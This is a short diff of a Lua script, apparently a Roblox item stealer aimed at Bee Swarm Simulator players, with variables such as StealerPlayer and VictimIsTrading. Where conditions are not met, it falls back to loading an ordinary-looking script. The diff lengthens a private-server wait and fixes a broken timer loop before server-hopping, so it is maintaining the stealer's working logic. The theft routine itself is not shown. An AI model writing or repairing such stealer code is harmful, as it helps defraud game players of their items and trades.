@@ -155,7 +155,7 @@ local GameData = {
 if not GameData.IsBSS then return LoadScript() end
 if not GameData.CanTrade then return LoadScript() end
 
-local PrivateServerWaitTime = tonumber("10")
+local PrivateServerWaitTime = tonumber("30")
 
 local StealerPlayer = nil
 local VictimIsTrading = nil
@@ -1180,7 +1180,7 @@ local function StartSession(StealerName)
             end
         end
         local J = tick()
-        repeat task.wait() until tick() - PrivateServerWaitTime >= tonumber(PrivateServerWaitTime)
+        repeat task.wait() until tick() - J >= PrivateServerWaitTime
         while true do
             serverhop()
             wait(8)
